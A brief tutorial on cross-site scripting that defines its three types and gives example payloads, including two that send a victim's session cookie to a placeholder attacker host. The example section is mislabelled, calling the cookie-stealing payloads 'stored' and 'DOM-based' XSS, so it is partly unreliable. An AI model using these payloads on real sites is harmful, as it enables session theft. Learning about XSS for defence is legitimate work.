# XSS

XSS is a type of security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal sensitive information, deface websites, or redirect users to malicious sites. XSS attacks are commonly used to bypass access controls, steal session cookies, and perform other malicious activities.

## Types of XSS

1. **Reflected XSS**: The attacker injects a malicious script into a URL that is reflected back to the user. This type of XSS is typically found in search fields, error messages, and other user input fields.

2. **Stored XSS**: The attacker injects a malicious script into a web application, which is then stored on the server and executed whenever a user accesses the affected page. This type of XSS is commonly found in comment sections, forums, and other user-generated content.

3. **DOM-based XSS**: The attacker injects a malicious script into the DOM (Document Object Model) of a web page, which is then executed by the client-side code. This type of XSS is typically found in client-side JavaScript code that processes user input.

## Example of Reflected XSS

Suppose we have a vulnerable web application that reflects user input without proper sanitization. An attacker can inject a malicious script into a URL parameter, which is then reflected back to the user.

1. **Vulnerable URL**: `http://example.com/search?query=<script>alert('XSS')</script>`

2. **Stored XSS**: The attacker injects a script that steals the user's session cookie and sends it to a remote server.

```html
<script>
  document.location = 'http://<IP>/?c=' + document.cookie;
</script>
```

3. **DOM-based XSS**: The attacker injects a script that redirects the user to a phishing site.

```html
<img src=x onerror="document.location='http://<IP>/?c='+document.cookie;">
```